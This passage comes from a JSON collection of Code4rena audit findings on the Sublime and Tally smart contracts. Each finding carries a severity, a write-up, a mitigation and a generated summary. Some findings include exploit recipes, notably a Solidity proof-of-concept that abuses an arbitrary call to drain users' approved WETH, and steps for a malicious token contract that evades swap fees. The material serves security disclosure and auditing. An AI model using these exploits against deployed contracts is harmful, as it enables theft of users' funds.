msg.value.sub(_borrowTokens, 'Insufficient ETH to liquidate');\n            if (_returnETH != 0) {\n                (bool success, ) = msg.sender.call{value: _returnETH}('');\n                require(success, 'Transfer fail');\n            }\n        } else {\n        IERC20(_borrowAsset).safeTransferFrom(msg.sender, _lender, _borrowTokens);\n        }\n    }\n    \n    _transferCollateral(_id, _collateralAsset, _totalCollateralTokens, _toSavingsAccount); \n    emit  CreditLineLiquidated(_id, msg.sender);\n}\n```\n\nSo, if `autoLiquidation` is false, the code inside of the if statement will simply not be executed, and there are no further checks that the sender HAS to be the lender if `autoLiquidation` is false. This means that anyone can liquidate a non-autoLiquidation credit line, and receive all of the collateral without first transferring the necessary borrow tokens.\n\nFor a further proof of concept, consider the test file here: <https://github.com/code-423n4/2021-12-sublime/blob/main/test/CreditLines/2.spec.ts>. If the code on line 238 is changed from `let  _autoLiquidation: boolean  =  true;` to `let  _autoLiquidation: boolean  =  false;`, all the test cases will still pass. This confirms the issue, as the final test case \"Liquidate credit line\" has the `admin` as the liquidator, which should not work in non-autoLiquidations since they are not the lender.\n\n#### Tools Used\n\nInspection and confirmed with Hardhat.\n\n#### Recommended Mitigation Steps\n\nAdd the following require statement somewhere in the `liquidate` function:\n```solidity\nrequire(\n    creditLineConstants[_id].autoLiquidation || \n    msg.sender == creditLineConstants[_id].lender,\n    \"not autoLiquidation and not lender\");\n```\n\n#### [ritik99 (Sublime) labeled](https://github.com/code-423n4/2021-12-sublime-findings/issues/96) sponsor confirmed\n\n\n",
      "summary": "\nThis bug report concerns the Sublime Finance platform, which allows users to set up credit lines and liquidate them. The issue is that if a credit line has autoLiquidation set to false, anyone can liquidate the position, rather than just the lender, as intended. Worse yet, when autoLiquidation is set to false, the liquidator does not have to supply the initial amount of borrow tokens that normally have to be transferred when autoLiquidation is true. This means that the liquidator will be sent all of the collateral that is supposed to be sent to the lender, resulting in a huge loss to the lender. \n\nThe code responsible for this issue can be found in the CreditLine.sol file, where the autoLiquidation value is only used in one place. The proof of concept was confirmed with the Hardhat tool, and the recommended mitigation step is to add a require statement somewhere in the liquidate function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/96",
      "tags": [],
      "finders": [
        "harleythedog"
      ]
    },
    {
      "id": "1188",
      "title": "[H-05] Aave's share tokens are rebasing breaking current strategy code",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by WatchPug and leastwood_\n\nWhen depositing into Aave through the `AaveYield.lockTokens` contract strategy, one receives the `sharesReceived` amount corresponding to the diff of `aToken` balance, which is just always the deposited amount as aave is a rebasing token and `1.0 aToken = 1.0 underlying` at each deposit / withdrawal.\n\nNote that this `sharesReceived` (the underlying deposit amount) is cached in a `balanceInShares` map in `SavingsAccount.deposit` which makes this share *static* and not dynamically rebasing anymore:\n\n```solidity\nfunction deposit(\n    uint256 _amount,\n    address _token,\n    address _strategy,\n    address _to\n) external payable override nonReentrant returns (uint256) {\n    require(_to != address(0), 'SavingsAccount::deposit receiver address should not be zero address');\n    uint256 _sharesReceived = _deposit(_amount, _token, _strategy);\n    balanceInShares[_to][_token][_strategy] = balanceInShares[_to][_token][_strategy].add(_sharesReceived);\n    emit Deposited(_to, _sharesReceived, _token, _strategy);\n    return _sharesReceived;\n}\n\nfunction getTokensForShares(uint256 shares, address asset) public view override returns (uint256 amount) {\n    if (shares == 0) return 0;\n    address aToken = liquidityToken(asset);\n\n    (, , , , , , , uint256 liquidityIndex, , ) = IProtocolDataProvider(protocolDataProvider).getReserveData(asset);\n\n    // @audit-info tries to do (user shares / total shares) * underlying amount where underlying amount = scaledBalance * liquidityIndex\n    amount = IScaledBalanceToken(aToken).scaledBalanceOf(address(this)).mul(liquidityIndex).mul(shares).div(\n        IERC20(aToken).balanceOf(address(this))\n    );\n}\n```\n\nHowever, the `getTokensForShares` function uses a rebasing total share supply of `IERC20(aToken).balanceOf(this)`.\n\n###### POC\n\n*   SavingsAccount deposits 1000 DAI for user and user receives 1000 aDAI as shares. These shares are cached in `balanceInShares[user][dai][aave]`.\n*   Time passes, Aave accrues interest for lenders, and the initial 1000 aTokens balance has rebased to 1200 aTokens\n*   SavingsAccount `withdraw`s 1000 aDAI shares for user which calls `AaveYield.unlockTokens`. The user receives only 1000 DAI. The interest owed to the user is not paid out.\n*   Note that `getTokensForShares` also returns the wrong amount as `1200 * 1000 / 1200 = 1000`\n\n#### Impact\n\nInterest is not paid out to users.\nPool collateral is measured without the interest accrued as it uses `getTokensForShares` which will lead to early liquidations and further loss.\n\n#### Recommended Mitigation Steps\n\nIf the user shares are not rebasing, you cannot have the \"total shares supply\" (the shares in the contract) be rebasing as in `getTokensForShares`. Also withdrawing the share amount directly from Aave as in `_withdrawERC` does not withdraw the yield.\nA fix could be to create a *non-rebasing* wrapper LP token that is paid out to the user proportional to the current strategy TVL at time of user deposit.\n\n**[ritik99 (Sublime) acknowledged](https://github.com/code-423n4/2021-12-sublime-findings/issues/137#issuecomment-1001476854):**\n > We've been aware of this issue for some time.. ended up including the AaveYield file in the scope by mistake! We do not plan to include the Aave strategy in our launch (we maintain a strategy registry that allows us to add/drop yield strategies), and as noted in #128, we will be utilizing [wrapper contracts](https://github.com/aave/protocol-v2/blob/feat-atoken-wrapper-liquidity-mining/contracts/protocol/tokenization/StaticATokenLM.sol) that mimics behaviour of non-rebasing LP tokens\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-12-sublime-findings/issues/137#issuecomment-1018051683):**\n > going to side with the warden since they believed the contract to be in scope and it's a valid concern.\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the AaveYield.lockTokens contract strategy when depositing into Aave. Currently, when a user deposits into Aave, they receive the same amount of shares as the deposited amount. This share amount is then cached in a balanceInShares map in SavingsAccount.deposit. This means that the share amount is static and not dynamically rebasing anymore. When a user withdraws, they only receive the amount of the initial deposit, not the amount that should have been accrued with the interest. This means that the user does not receive the interest owed to them. Additionally, the collateral pool is measured without the interest accrued, which can lead to early liquidations and further loss.\n\nIn order to fix this vulnerability, a non-rebasing wrapper LP token should be created, which is paid out to the user proportional to the current strategy TVL at the time of the user's deposit.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/137",
      "tags": [
        "Wrong Math",
        "Rebasing Tokens"
      ],
      "finders": [
        "cmichel",
        "WatchPug  leastwood"
      ]
    },
    {
      "id": "1187",
      "title": "[H-04] Yearn token <> shares conversion decimal issue",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe yearn strategy `YearnYield` converts shares to tokens by doing `pricePerFullShare * shares / 1e18`:\n\n    function getTokensForShares(uint256 shares, address asset) public view override returns (uint256 amount) {\n        if (shares == 0) return 0;\n        // @audit should divided by vaultDecimals \n        amount = IyVault(liquidityToken[asset]).getPricePerFullShare().mul(shares).div(1e18);\n    }\n\nBut Yearn's `getPricePerFullShare` seems to be [in `vault.decimals()` precision](https://github.com/yearn/yearn-vaults/blob/03b42dacacec2c5e93af9bf3151da364d333c222/contracts/Vault.vy#L1147), i.e., it should convert it as `pricePerFullShare * shares / (10 ** vault.decimals())`.\nThe vault decimals are the same [as the underlying token decimals](https://github.com/yearn/yearn-vaults/blob/03b42dacacec2c5e93af9bf3151da364d333c222/contracts/Vault.vy#L295-L296)\n\n#### Impact\n\nThe token and shares conversions do not work correctly for underlying tokens that do not have 18 decimals.\nToo much or too little might be paid out leading to a loss for either the protocol or user.\n\n#### Recommended Mitigation Steps\n\nDivide by `10**vault.decimals()` instead of `1e18` in `getTokensForShares`.\nApply a similar fix in `getSharesForTokens`.\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/134)** \n\n",
      "summary": "\nA bug has been reported in the Yearn strategy \"YearnYield\". This bug affects the token and shares conversion, resulting in the incorrect amount of tokens or shares being paid out. This could lead to a loss for either the protocol or user. The bug is caused by the use of `1e18` in the `getTokensForShares` function, when it should be divided by `10**vault.decimals()` instead. The same fix should also be applied to the `getSharesForTokens` function. The recommended mitigation steps are to divide by `10**vault.decimals()` instead of `1e18` in `getTokensForShares` and to apply the same fix in `getSharesForTokens`.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/134",
      "tags": [
        "Decimals",
        "Wrong Math"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1186",
      "title": "[H-03] denial of service",
      "impact": "HIGH",
      "content": "_Submitted by certora_\n\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/Pool/Pool.sol#L645>\nif the borrow token is address(0) (ether), and someone calls withdrawLiquidity, it calls SavingsAccountUtil.transferTokens which will transfer to msg.sender, msg.value (of withdrawLiquidity, because it's an internal function). In other words, the liquidity provided will pay to themselves and their liquidity tokens will still be burned. therefore they will never be able to get their funds back.\n\n#### Recommended Mitigation Steps\n\nthe bug is in\n<https://github.com/code-423n4/2021-12-sublime/blob/main/contracts/SavingsAccount/SavingsAccountUtil.sol>\nIt is wrong to use msg.value in transferTokens because it'll be the msg.value of the calling function.\ntherefore every transfer of ether using this function is wrong and dangerous, the solution is to remove all msg.value from this function and just transfer \\_amount regularly.\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/154) **\n\n\n",
      "summary": "\nA bug was identified in the Pool.sol file of the code-423n4/2021-12-sublime repository on GitHub. If the borrow token is address(0) (ether) and someone calls withdrawLiquidity, it calls SavingsAccountUtil.transferTokens which will transfer to msg.sender, msg.value (of withdrawLiquidity, because it's an internal function). This means that the liquidity provided will pay to themselves and their liquidity tokens will still be burned, meaning they will never be able to get their funds back.\n\nThe recommended mitigation steps are to remove all msg.value from the SavingsAccountUtil.sol file and just transfer the _amount regularly. This is because using msg.value in the transferTokens function is wrong and dangerous.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/154",
      "tags": [],
      "finders": [
        "certora"
      ]
    },
    {
      "id": "1185",
      "title": "[H-02] Wrong returns of `SavingsAccountUtil.depositFromSavingsAccount()` can cause fund loss",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nThe function `SavingsAccountUtil.depositFromSavingsAccount()` is expected to return the number of equivalent shares for given `_asset`.\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L225-L267>\n\n```solidity\n/**\n * @notice internal function used to get amount of collateral deposited to the pool\n * @param _fromSavingsAccount if true, collateral is transferred from _sender's savings account, if false, it is transferred from _sender's wallet\n * @param _toSavingsAccount if true, collateral is transferred to pool's savings account, if false, it is withdrawn from _sender's savings account\n * @param _asset address of the asset to be deposited\n * @param _amount amount of tokens to be deposited in the pool\n * @param _poolSavingsStrategy address of the saving strategy used for collateral deposit\n * @param _depositFrom address which makes the deposit\n * @param _depositTo address to which the tokens are deposited\n * @return _sharesReceived number of equivalent shares for given _asset\n */\nfunction _deposit(\n    bool _fromSavingsAccount,\n    bool _toSavingsAccount,\n    address _asset,\n    uint256 _amount,\n    address _poolSavingsStrategy,\n    address _depositFrom,\n    address _depositTo\n) internal returns (uint256 _sharesReceived) {\n    if (_fromSavingsAccount) {\n        _sharesReceived = SavingsAccountUtil.depositFromSavingsAccount(\n            ISavingsAccount(IPoolFactory(poolFactory).savingsAccount()),\n            _depositFrom,\n            _depositTo,\n            _amount,\n            _asset,\n            _poolSavingsStrategy,\n            true,\n            _toSavingsAccount\n        );\n    } else {\n        _sharesReceived = SavingsAccountUtil.directDeposit(\n            ISavingsAccount(IPoolFactory(poolFactory).savingsAccount()),\n            _depositFrom,\n            _depositTo,\n            _amount,\n            _asset,\n            _toSavingsAccount,\n            _poolSavingsStrategy\n        );\n    }\n}\n```\n\nHowever, since `savingsAccountTransfer()` does not return the result of `_savingsAccount.transfer()`, but returned `_amount` instead, which means that `SavingsAccountUtil.depositFromSavingsAccount()` may not return the actual shares (when pps is not 1).\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccountUtil.sol#L11-L26>\n\n```solidity\nfunction depositFromSavingsAccount(\n    ISavingsAccount _savingsAccount,\n    address _from,\n    address _to,\n    uint256 _amount,\n    address _token,\n    address _strategy,\n    bool _withdrawShares,\n    bool _toSavingsAccount\n) internal returns (uint256) {\n    if (_toSavingsAccount) {\n        return savingsAccountTransfer(_savingsAccount, _from, _to, _amount, _token, _strategy);\n    } else {\n        return withdrawFromSavingsAccount(_savingsAccount, _from, _to, _amount, _token, _strategy, _withdrawShares);\n    }\n}\n```\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/SavingsAccount/SavingsAccountUtil.sol#L66-L80>\n\n```solidity\nfunction savingsAccountTransfer(\n    ISavingsAccount _savingsAccount,\n    address _from,\n    address _to,\n    uint256 _amount,\n    address _token,\n    address _strategy\n) internal returns (uint256) {\n    if (_from == address(this)) {\n        _savingsAccount.transfer(_amount, _token, _strategy, _to);\n    } else {\n        _savingsAccount.transferFrom(_amount, _token, _strategy, _from, _to);\n    }\n    return _amount;\n}\n```\n\nAs a result, the recorded `_sharesReceived` can be wrong.\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/Pool/Pool.sol#L207-L223>\n\n```solidity\nfunction _depositCollateral(\n    address _depositor,\n    uint256 _amount,\n    bool _transferFromSavingsAccount\n) internal nonReentrant {\n    uint256 _sharesReceived = _deposit(\n        _transferFromSavingsAccount,\n        true,\n        poolConstants.collateralAsset,\n        _amount,\n        poolConstants.poolSavingsStrategy,\n        _depositor,\n        address(this)\n    );\n    poolVariables.baseLiquidityShares = poolVariables.baseLiquidityShares.add(_sharesReceived);\n    emit CollateralAdded(_depositor, _amount, _sharesReceived);\n}\n```\n\n##### PoC\n\nGiven:\n\n*   the price per share of yearn USDC vault is `1.2`\n\n1.  Alice deposited `12,000 USDC` to `yearn` strategy, received `10,000` share tokens;\n2.  Alice created a pool, and added all the `12,000 USDC` from the saving account as collateral; The recorded `CollateralAdded` got the wrong number: `12000` which should be `10000`;\n3.  Alice failed to borrow money with the pool and tries to `cancelPool()`, it fails as the recorded collateral `shares` are more than the actual collateral.\n\nAs a result, Alice has lost all the `12,000 USDC`.\n\nIf Alice managed to borrow with the pool, when the loan defaults, the liquidation will also fail, and cause fund loss to the lenders.\n\n##### Recommendation\n\nChange to:\n\n```solidity\nfunction savingsAccountTransfer(\n    ISavingsAccount _savingsAccount,\n    address _from,\n    address _to,\n    uint256 _amount,\n    address _token,\n    address _strategy\n) internal returns (uint256) {\n    if (_from == address(this)) {\n        return _savingsAccount.transfer(_amount, _token, _strategy, _to);\n    } else {\n        return _savingsAccount.transferFrom(_amount, _token, _strategy, _from, _to);\n    }\n}\n```\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/132)**\n\n\n",
      "summary": "\nA bug has been found in the function `SavingsAccountUtil.depositFromSavingsAccount()` which is expected to return the number of equivalent shares for a given asset. This is because the `savingsAccountTransfer()` does not return the result of `_savingsAccount.transfer()`, but instead returns `_amount`. As a result, the recorded `_sharesReceived` can be wrong.\n\nThis bug can lead to fund loss in a number of ways. For example, if Alice deposited 12,000 USDC to a yearn strategy, received 10,000 share tokens, created a pool and added all the 12,000 USDC from the saving account as collateral, the recorded `CollateralAdded` would be wrong and Alice would be unable to borrow money with the pool. If Alice tried to `cancelPool()`, it would fail as the recorded collateral `shares` would be more than the actual collateral. As a result, Alice would have lost all the 12,000 USDC. If Alice had managed to borrow with the pool, then when the loan defaults, the liquidation would also fail and cause fund loss to the lenders.\n\nThe bug can be fixed by changing the code of `savingsAccountTransfer()` to the following:\n\n```solidity\nfunction savingsAccountTransfer(\n    ISavingsAccount _savingsAccount,\n    address _from,\n    address _to,\n    uint256 _amount,\n    address _token,\n    address _strategy\n) internal returns (uint256) {\n    if (_from == address(this)) {\n        return _savingsAccount.transfer(_amount, _token, _strategy, _to);\n    } else {\n        return _savingsAccount.transferFrom(_amount, _token, _strategy, _from, _to);\n    }\n}\n```",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/132",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1184",
      "title": "[H-01] In `CreditLine#_borrowTokensToLiquidate`, oracle is used wrong way",
      "impact": "HIGH",
      "content": "_Submitted by 0x0x0x_\n\nCurrent implementation to get the price is as follows:\n\n`(uint256 _ratioOfPrices, uint256 _decimals) = IPriceOracle(priceOracle).getLatestPrice(_borrowAsset, _collateralAsset);`\n\n<https://github.com/code-423n4/2021-12-sublime/blob/9df1b7c4247f8631647c7627a8da9bdc16db8b11/contracts/CreditLine/CreditLine.sol#L1050>\n\nBut it should not consult `borrowToken / collateralToken`, rather it should consult the inverse of this result. As a consequence, in `liquidate` the liquidator/lender can lose/gain funds as a result of this miscalculation.\n\n#### Mitigation step\n\nReplace it with\n\n`(uint256 _ratioOfPrices, uint256 _decimals) = IPriceOracle(priceOracle).getLatestPrice(_collateralAsset, _borrowAsset);`\n\n**[ritik99 (Sublime) confirmed](https://github.com/code-423n4/2021-12-sublime-findings/issues/155)**\n\n\n",
      "summary": "\nThis bug report is about an issue found in the CreditLine.sol contract, which is part of the code-423n4/2021-12-sublime repository. The issue is with the implementation to get the price, which is currently set as `(uint256 _ratioOfPrices, uint256 _decimals) = IPriceOracle(priceOracle).getLatestPrice(_borrowAsset, _collateralAsset);`. This implementation is incorrect as it should not consult `borrowToken / collateralToken`, rather it should consult the inverse of this result. As a consequence, in `liquidate` the liquidator/lender can lose/gain funds as a result of this miscalculation.\n\nThe mitigation step is to replace the current implementation with `(uint256 _ratioOfPrices, uint256 _decimals) = IPriceOracle(priceOracle).getLatestPrice(_collateralAsset, _borrowAsset);`. This should resolve the issue and prevent the liquidator/lender from losing/gaining funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Sublime",
      "source_link": "https://code4rena.com/reports/2021-12-sublime",
      "github_link": "https://github.com/code-423n4/2021-12-sublime-findings/issues/155",
      "tags": [],
      "finders": [
        "0x0x0x"
      ]
    },
    {
      "id": "42313",
      "title": "[M-01] Swap.sol implements potentially dangerous transfer",
      "impact": "MEDIUM",
      "content": "_Submitted by elprofesor, also found by WatchPug, Koustre, cmichel, JMukesh, and pauliax_\n\n#### Impact\nThe use of `transfer()`  in ` Swap.sol`   may have unintended outcomes on the eth being sent to the receiver. Eth may be irretrievable or undelivered if the `msg.sender`   or `feeRecipient`   is a smart contract. Funds can potentially be lost if;\n\n1.  The smart contract fails to implement the payable fallback function\n2.  The fallback function uses more than 2300 gas units\n\nThe latter situation may occur in the instance of gas cost changes. The impact would mean that any contracts receiving funds would potentially be unable to retrieve funds from the swap.\n\n#### Proof of Concept\nThis issue directly impacts the following lines of code:\n- [L257](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L257)\n- [L173](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L173)\n- [L158](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L158)\n\nExamples of similar issues ranked as medium can be found [here](https://github.com/code-423n4/2021-08-notional-findings/issues/15) and [here, just search for 'M04'](https://blog.openzeppelin.com/opyn-gamma-protocol-audit/). A detailed explanation of why relying on `payable().transfer()` may result in unexpected loss of eth can be found [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/)\n\n#### Tools Used\nManual review\n\n#### Recommended Mitigation Steps\nRe-entrancy has been accounted for in all functions that reference ` Solidity's   `  transfer() `  . This has been done by using a re-entrancy guard, therefore, we can rely on `  msg.sender.call.value(amount)\\`  or using the OpenZeppelin [Address.sendValue library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.1/contracts/utils/Address.sol#L63)\n\n**[Shadowfiend (Tally) acknowledged](https://github.com/code-423n4/2021-10-tally-findings/issues/20)**\n\n",
      "summary": "\nThis bug report is about a potential issue with the use of the `transfer()` function in the `Swap.sol` contract. This could result in the unintended loss of funds if the `msg.sender` or `feeRecipient` is a smart contract and certain conditions are met. These conditions include the smart contract not having a payable fallback function or the fallback function using more than 2300 gas units. This could happen if there are changes in gas costs. The report also mentions similar issues that have been ranked as medium in other projects. The recommended mitigation steps include using a re-entrancy guard or the OpenZeppelin Address.sendValue library. The issue has been acknowledged by Shadowfiend (Tally).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tally",
      "source_link": "https://code4rena.com/reports/2021-10-tally",
      "github_link": "https://github.com/code-423n4/2021-10-tally-findings/issues/20",
      "tags": [],
      "finders": []
    },
    {
      "id": "42312",
      "title": "[H-02] Wrong calculation of `erc20Delta` and `ethDelta`",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug, also found by harleythedog_\n\n[`Swap.sol` L200-L225](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L200-L225)\n\n```solidity\nfunction fillZrxQuote(\n    IERC20 zrxBuyTokenAddress,\n    address payable zrxTo,\n    bytes calldata zrxData,\n    uint256 ethAmount\n) internal returns (uint256, uint256) {\n    uint256 originalERC20Balance = 0;\n    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {\n        originalERC20Balance = zrxBuyTokenAddress.balanceOf(address(this));\n    }\n    uint256 originalETHBalance = address(this).balance;\n\n    (bool success,) = zrxTo.call{value: ethAmount}(zrxData);\n    require(success, \"Swap::fillZrxQuote: Failed to fill quote\");\n\n    uint256 ethDelta = address(this).balance.subOrZero(originalETHBalance);\n    uint256 erc20Delta;\n    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {\n        erc20Delta = zrxBuyTokenAddress.balanceOf(address(this)).subOrZero(originalERC20Balance);\n        require(erc20Delta > 0, \"Swap::fillZrxQuote: Didn't receive bought token\");\n    } else {\n        require(ethDelta > 0, \"Swap::fillZrxQuote: Didn't receive bought ETH\");\n    }\n\n    return (erc20Delta, ethDelta);\n}\n```\n\nWhen a user tries to swap unwrapped ETH to ERC20, even if there is a certain amount of ETH refunded, at L215, `ethDelta` will always be `0`.\n\nThat's because `originalETHBalance` already includes the `msg.value` sent by the caller.\n\nLet's say the ETH balance of the contract is `1 ETH` before the swap.\n\n*   A user swaps `10 ETH` to USDC;\n*   `originalETHBalance` will be `11 ETH`;\n*   If there is `1 ETH` of refund;\n*   `ethDelta` will be `0` as the new balance is `2 ETH` and `subOrZero(2, 11)` is `0`.\n\nSimilarly, `erc20Delta` is also computed wrong.\n\nConsider a special case of a user trying to arbitrage from `WBTC` to `WBTC`, the `originalERC20Balance` already includes the input amount, `erc20Delta` will always be much lower than the actual delta amount.\n\nFor example, for an arb swap from `1 WBTC` to `1.1 WBTC`, the `ethDelta` will be `0.1 WBTC` while it should be `1.1 WBTC`.\n\n##### Impact\n*   User can not get ETH refund for swaps from ETH to ERC20 tokens;\n*   Arb swap with the same input and output token will suffer the loss of almost all of their input amount unexpectedly.\n\n##### Recommendation\nConsider subtracting the input amount from the originalBalance.\n\n**[Shadowfiend (Tally) confirmed](https://github.com/code-423n4/2021-10-tally-findings/issues/34#issuecomment-961228745):**\n > This doesn't allow explicit stealing by an attacker, but does leak value. We would suggest a (2) severity on this.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-10-tally-findings/issues/34#issuecomment-962285115):**\n > This results in a user losing assets that they will never be able to recover. Per documentation\n>\n> `\n> 3 â€” High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n>\n> Lost assets are a high sev.\n\n",
      "summary": "\nThe bug report is about a problem in the `Swap.sol` contract, which is used for swapping different tokens. The issue was reported by two users, WatchPug and harleythedog. \n\nThe problem occurs when a user tries to swap ETH (Ethereum) for an ERC20 token. Even if the swap is successful and the user receives a refund of ETH, the variable `ethDelta` will always be zero. This is because the variable `originalETHBalance` already includes the amount of ETH sent by the user. This means that the user will not receive the correct amount of ETH back as a refund.\n\nSimilarly, the variable `erc20Delta` is also calculated incorrectly. This can cause issues when a user tries to swap between the same token, as the original balance already includes the input amount.\n\nThis bug has a significant impact on users as they may not receive the correct amount of ETH back when swapping tokens. It can also result in users losing assets, especially in the case of arbitrage swaps between the same token.\n\nThe recommendation is to subtract the input amount from the original balance to fix this issue. This bug has been confirmed by Shadowfiend from Tally, and 0xean, a judge, has commented that it results in users losing assets, which is considered a high severity issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tally",
      "source_link": "https://code4rena.com/reports/2021-10-tally",
      "github_link": "https://github.com/code-423n4/2021-10-tally-findings/issues/34",
      "tags": [],
      "finders": []
    },
    {
      "id": "42311",
      "title": "[H-01] Arbitrary contract call allows attackers to steal ERC20 from users' wallets",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\n[`Swap.sol L200-L212`](https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L200-L212)\n\n```solidity\nfunction fillZrxQuote(\n    IERC20 zrxBuyTokenAddress,\n    address payable zrxTo,\n    bytes calldata zrxData,\n    uint256 ethAmount\n) internal returns (uint256, uint256) {\n    uint256 originalERC20Balance = 0;\n    if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {\n        originalERC20Balance = zrxBuyTokenAddress.balanceOf(address(this));\n    }\n    uint256 originalETHBalance = address(this).balance;\n\n    (bool success,) = zrxTo.call{value: ethAmount}(zrxData);\n```\n\nA call to an arbitrary contract with custom calldata is made in `fillZrxQuote()`, which means the contract can be an ERC20 token, and the calldata can be `transferFrom` a previously approved user.\n\n##### Impact\nThe wallet balances (for the amount up to the allowance limit) of the tokens that users approved to the contract can be stolen.\n\n##### PoC\nGiven:\n\n*   Alice has approved 1000 WETH to `Swap.sol`;\n\nThe attacker can:\n```solidity\nTallySwap.swapByQuote(\n    address(WETH),\n    0,\n    address(WETH),\n    0,\n    address(0),\n    address(WETH),\n    abi.encodeWithSignature(\n        \"transferFrom(address,address,uint256)\",\n        address(Alice),\n        address(this),\n        1000 ether\n    )\n)\n```\n\nAs a result, 1000 WETH will be stolen from Alice and sent to the attacker.\n\nThis PoC has been tested on a forking network.\n\n##### Recommendation\nConsider adding a whitelist for `zrxTo` addresses.\n\n\n**[Shadowfiend (Tally) confirmed](https://github.com/code-423n4/2021-10-tally-findings/issues/37)**\n\n",
      "summary": "\nThe bug report is about a vulnerability in a smart contract called `Swap.sol`. The vulnerability allows an attacker to steal tokens that have been approved by users to the contract. The report includes a proof-of-concept (PoC) showing how an attacker can steal 1000 WETH from a user named Alice. The report recommends adding a whitelist for certain addresses to prevent this type of attack. The vulnerability has been confirmed by Shadowfiend (Tally), the team responsible for the contract. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tally",
      "source_link": "https://code4rena.com/reports/2021-10-tally",
      "github_link": "https://github.com/code-423n4/2021-10-tally-findings/issues/37",
      "tags": [],
      "finders": []
    },
    {
      "id": "921",
      "title": "[M-03] Users can avoid paying fees for ETH swaps",
      "impact": "MEDIUM",
      "content": "_Submitted by pants_\n\nUsers can call `Swap.swapByQuote()` to execute an ETH swap (where they receive ETH) without paying swap fee for the gained ETH. They can trick the system by setting `zrxBuyTokenAddress` to an address of a malicious contract and making it think they have executed an ERC20 swap when they have actually executed an ETH swap. In this case, the system will give them the ETH they got from the swap (`boughtETHAmount`) without charging any swap fees for it, because the systems consideres this ETH as \"refunded ETH\" that wasn't part of the \"ERC20\" swap.\n\n#### Impact\nUsers can execute ETH swap without paying swap fees for the ETH the got from the swap.\n\n#### Proof of Concept\nThe steps of the attack are:\n\n1.  Deploy a malicious contract (denoted by `M`), that will be used for `zrxBuyTokenAddress`.\n2.  Call `Swap.swapByQuote()` with `zrxBuyTokenAddress=M` and `minimumAmountReceived=0`. The rest of the arguments should specify our ETH swap, nothing special here.\n3.  Define `M` to return `0` and `1` at the first and second times when `fillZrxQuote` calls `zrxBuyTokenAddress.balanceOf(address(this))`, respectively.\n4.  As a result, `boughtERC20Amount` now equals `1` and the function will \"return any refunded ETH\" to the caller, without charging any swap fees on it. This ETH is actually the output of that ETH swap.\n\n#### Tool Used\nManual code review.\n\n#### Recommended Mitigation Steps\nCharge swap fees for the \"refunded ETH\" on ERC20 swaps (when `boughtERC20Amount > 0`), or require `boughtETHAmount == 0`.\n\n**[Shadowfiend (Tally) 